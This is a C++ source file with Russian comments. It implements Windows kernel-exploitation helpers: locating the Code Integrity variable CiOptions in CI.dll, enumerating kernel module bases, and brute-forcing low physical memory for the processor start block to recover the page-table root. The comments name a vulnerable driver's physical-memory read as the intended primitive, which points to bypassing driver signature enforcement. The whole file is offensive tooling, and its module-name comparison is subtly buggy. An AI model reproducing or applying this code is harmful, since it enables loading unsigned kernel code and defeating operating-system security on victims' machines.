#include "global.h"

#ifdef __um__
void* ntGetCiOptions () {
	void* pCiImageBase = ntGetImageBase("CI.dll");
	auto  rvaCiOptions = ntGetRvaCiOptions(pCiImageBase);
	void* pCiOptions   = (void*)((uintptr_t)pCiImageBase + rvaCiOptions);
	return pCiOptions;
}

// брутфорс 2^20 = 1MB памяти реального режима в поисках _PROCESSOR_START_BLOCK
// на самом деле структура обычно валяется после 10-го PFN
// fnRead любой примитив чтения физ.памяти. Например, функция уязвимого провайдера
physaddr ntGetPml4Base (funcReadPa fnRead) {
	_PROCESSOR_START_BLOCK psb {0};

	for (uintptr_t pa = 0x10000; pa <= RM_SIZE; pa += PAGE_4K_SIZE) {
		fnRead((physaddr)pa, (void*)&psb, sizeof(psb));
		if (psb.Jmp.OpCode != 0xe9 || psb.CompletionFlag != true) continue;
		return (physaddr)psb.ProcessorState.SpecialRegisters.Cr3;
	}

	return nullptr;
}

void* ntGetImageBase (IN const char* szModuleName) {
	void* ret = nullptr;

	ULONG	 size {0};
	NTSTATUS ntstatus = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);

	PRTL_PROCESS_MODULES pProcessModules = (PRTL_PROCESS_MODULES)VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	ntstatus							 = NtQuerySystemInformation(SystemModuleInformation, pProcessModules, size, nullptr);
	cntstatus(ntstatus);

	PRTL_PROCESS_MODULE_INFORMATION pModuleInfo = &pProcessModules->Modules[0];

	for (size_t i = 0; i < pProcessModules->NumberOfModules; i++, pModuleInfo++) {
		PCHAR szCurrModuleName = (PCHAR)pModuleInfo->FullPathName + pModuleInfo->OffsetToFileName;

		if (memcmp(szCurrModuleName, szModuleName, sizeof(szModuleName)) != 0)
			continue;

		ret = pModuleInfo->ImageBase;
	}

	VirtualFree(pProcessModules, 0, MEM_RELEASE);
	return ret;
}

uintptr_t ntGetRvaCiOptions (IN void* pImageBaseKrnl) {
	path  ciPath		  = getDrvDirW(L"CI.dll");
	void* pImageBase	  = mapfile(ciPath);
	void* pCiOptionsInstr = scanInSection(pImageBase, "PAGE", SIG_CI_OPTIONS, sizeof(SIG_CI_OPTIONS));

	hde64s	  disasm	 = disasm(pCiOptionsInstr);
	uintptr_t pCiOptions = (uintptr_t)disasm.pNextInstr + (int)disasm.disp.disp32;

	return pCiOptions - (uintptr_t)pImageBase;
}
#endif // __um__